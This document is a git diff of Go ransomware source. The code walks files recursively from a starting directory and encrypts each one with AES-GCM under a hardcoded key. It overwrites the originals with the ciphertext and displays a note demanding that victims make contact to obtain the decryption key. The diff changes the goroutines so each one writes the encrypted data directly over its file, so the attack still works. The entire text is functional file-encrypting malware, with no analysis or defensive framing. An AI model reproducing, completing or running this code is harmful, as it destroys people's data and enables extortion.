@@ -19,14 +19,21 @@ var Dir string = "/" // Insert starting directory
 var wg sync.WaitGroup
 
 func main() {
-	Encrypted := make(chan []byte, 100)
-	cryptoKey := "959148601e08d6cc80816964006a15ed54911fd32c3a77f7baaf5d74d4f895c0" //keygen.Keygen()
+	//Encrypted := make(chan []byte, 100)
+	cryptoKey := "686561646d696e64706172746e6572737265647465616d313333374031333337" //keygen.Keygen()
 	contact := ""                                                                   // Insert contact email
 	//fmt.Println("THIS IS THE KEY:", cryptoKey)
 
 	key, err := hex.DecodeString(cryptoKey)
 	if err != nil {
 		panic(err)
+	}
+
+	var root string
+	if runtime.GOOS == "windows" {
+		root = os.Getenv("USERPROFILE")
+	} else {
+		root = os.Getenv("HOME")
 	}
 
 	//use function mapfiles from explorer (gets every file recursive by decided dir except decrypter!)
@@ -41,20 +48,7 @@ func main() {
 			continue
 		}
 
-		go Encrypt(file, key, Encrypted)
-
-		if err != nil {
-			continue
-		}
-
-		ioutil.WriteFile(v, <-Encrypted, 0644)
-	}
-
-	var root string
-	if runtime.GOOS == "windows" {
-		root = os.Getenv("USERPROFILE")
-	} else {
-		root = os.Getenv("HOME")
+		go Encrypt(file, key, v)
 	}
 
 	msg := "Your files have been encrypted.\nContact " + contact + " to get the decrypter/ decrypt key."
@@ -67,7 +61,7 @@ func main() {
 	wg.Wait()
 }
 
-func Encrypt(plainText []byte, key []byte, Encrypted chan []byte) {
+func Encrypt(plainText []byte, key []byte, v string) {
 	defer wg.Done()
 	block, err := aes.NewCipher(key)
 
@@ -89,5 +83,7 @@ func Encrypt(plainText []byte, key []byte, Encrypted chan []byte) {
 
 	cypherText := gcm.Seal(nonce, nonce, plainText, nil)
 
-	Encrypted <- cypherText
+	//Encrypted <- cypherText
+
+	ioutil.WriteFile(v, cypherText, 0644)
 }
